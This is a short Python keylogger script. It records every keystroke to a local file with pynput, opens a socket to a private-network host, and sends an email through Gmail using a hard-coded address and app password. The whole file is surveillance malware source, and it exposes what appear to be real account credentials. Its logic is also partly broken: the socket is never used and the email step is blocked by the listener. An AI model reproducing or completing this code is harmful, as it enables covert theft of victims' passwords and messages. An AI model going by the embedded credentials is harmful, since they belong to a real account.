#!/usr/bin/env python3
from pynput.keyboard import Key, Listener
import os
import logging 
import subprocess
import smtplib
import socket

host = '192.168.1.11'
port = 9999

s = socket.socket()
s.connect((host, port))



gmail_user = 'firdanramadhangitddeluxe404@gmail.com'
gmail_app_password = 'Chandraramadhangitddeluxe407'

# =============================================================================
# SET THE INFO ABOUT THE SAID EMAIL
# =============================================================================
sent_from = gmail_user
sent_to = ['firdanramadhangitddeluxe404@gmail.com', 'patriotsecteam@gmail.com']
sent_subject = "Where are all my Robot Women at?"
sent_body = ("Hey, what's up? friend!\n\n"
             "I hope you have been well!\n"
             "\n"
             "Cheers,\n"
             "Jay\n")

email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (sent_from, ", ".join(sent_to), sent_subject, sent_body)




logging.basicConfig(filename=('/home/hmei7/Documents/key/keylog.txt'), level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()


try:
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    server.login(gmail_user, gmail_app_password)
    server.sendmail(sent_from, sent_to, email_text)
    server.close()

    print('Email sent!')
except Exception as exception:
    print("Error: %s!\n\n" % exception)















